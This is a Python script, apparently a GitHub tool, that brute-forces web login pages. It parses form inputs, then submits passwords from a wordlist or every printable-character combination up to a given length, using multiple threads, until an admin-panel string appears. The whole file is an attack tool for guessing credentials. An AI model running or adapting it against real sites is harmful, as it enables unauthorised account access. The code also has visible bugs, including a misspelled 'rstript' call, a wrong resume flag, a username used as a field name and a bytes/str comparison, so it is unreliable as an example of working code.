#!/usr/bin/env python3
# Author: WittsEnd2
# Contributors: 

from urllib.request import *
from urllib.parse import *
import http
from http.cookiejar import *
import threading
import sys
from itertools import product, chain
from queue import Queue
import argparse
from html.parser import HTMLParser
import string
import math
user_thread = 1
wordlist = None
list_of_words = []
username_field = None
password_field = ""
success_check = "Administration - Control Panel"
target_url = ""
target_post = ""
running_threads = []
num_characters = -1
resume = None
traditional_bruteforce = False

class Bruter(object):
    def __init__(self, username, words):
        self.username = username
        self.password_q = Queue(words)
        self.found = False

    def run_bruteforce(self):
        global user_thread
        for i in range(user_thread):
            global num_characters
            num_characters = int(num_characters)
            t = threading.Thread(target=self.web_bruter, args=(num_characters, i, ))
            running_threads.append(t)
            t.start()

    def web_bruter(self, num_characters, thread_num):

        while not self.password_q.empty() and not self.found:
            brute = self.password_q.get().rstrip()
            result = self.attempt_login(brute)
            if result == True:
                return True
        if traditional_bruteforce == True:
            starting_char = (num_characters//user_thread) * thread_num
            ending_char = (num_characters//user_thread) * (thread_num+1)
            bruteforce_strings = self.traditional_bruteforce(starting_char, ending_char)
            for i in bruteforce_strings:
                result = self.attempt_login(i)
                if result == True:
                    return True
        print("Thread: " + str(thread_num) + " is unable to find the password")
        return False

    def traditional_bruteforce(self, start, maxlength):
        return (''.join(candidate)
            for candidate in chain.from_iterable(product(string.printable, repeat=i)
            for i in range(start+1, maxlength + 1)))                 
    def attempt_login(self, password):
            jar = FileCookieJar("cookies")
            opener = build_opener(HTTPCookieProcessor(jar))
            response = opener.open(target_url)
            page = response.read()
            print("Trying: %s : %s" %
                  (self.username, password))
            parser = BruteParser()
            parser.feed(page)
            post_tags = parser.tag_results
            post_tags[username_field] = self.username
            post_tags[password_field] = password
            login_data = urlencode(post_tags)
            login_response = opener.open(target_post, login_data)
            login_result = login_response.read()
            if success_check in login_result:
                self.found = True
                print("[*] Bruteforce Successful")
                print("[*] Username %s" % self.username)
                print("[*] Password %s" % password)
                print("[*] Waiting for other threads to finish...")
                return True
            return False


class BruteParser(HTMLParser):
    def __init__(self):
        HTMLParser.__init__(self)
        self.tag_results = {}

    def handle_starttag(self, tag, attrs):
        if tag == "input":
            tag_name = None
            tag_value = None
            for name, value in attrs:
                if name == "name":
                    tag_name = value
                if name == "value":
                    tag_value = value

                if tag_name is not None:
                    self.tag_results[tag_name] = value

def build_wordlist(wordlist_file):
    fd = open(wordlist_file, "rb")
    raw_words = fd.readlines()
    fd.close()

    found_resume = False
    words = Queue()

    for word in raw_words:
        word = word.rstript()
        if resume is not None:
            if found_resume:
                words.put(word)
            else:
                if word == resume:
                    found_word = True
                    print("Resuming wordlist from: %s" % resume)
        else:
            words.put(word)
    return words

def main():
    global list_of_words
    global username_field
    if wordlist != None:
        list_of_words = build_wordlist(wordlist)
        
    brute = Bruter(username_field, list_of_words)
    
    brute.run_bruteforce()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Brute-force authentication")
    parser.add_argument('target', help="Target URL to attempt brute force - contains the front-end HTML")
    parser.add_argument('target_post', help="Target POST request. This is the endpoint where login is called.")
    parser.add_argument('num_characters', help="Maximum number of characters to brute force")
    parser.add_argument('-w', '--wordlist', help="Adds a wordlist to use for bruteforce. If none selected, it will do a traditional brute force")
    parser.add_argument('-u', '--username', help="Enters to be used. If none selected, will brute force username as well.")
    parser.add_argument('-t', '--threads', type=int, help="Sets number of threads to use. Default = 1")
    parser.add_argument('-b', '--traditional_bruteforce', type=bool, help="Run a traditional bruteforce if password not found in wordlist. Default is false")
    args = parser.parse_args()
    target_url = args.target
    target_post = args.target_post
    num_characters = args.num_characters
    if args.wordlist != None:
        wordlist = args.wordlist
    if args.threads != None and args.threads > 1:
        user_thread = args.threads
    if args.username != None:
        username_field = args.username
    if args.traditional_bruteforce != None:
        traditional_bruteforce = args.traditional_bruteforce
        
    main()
        

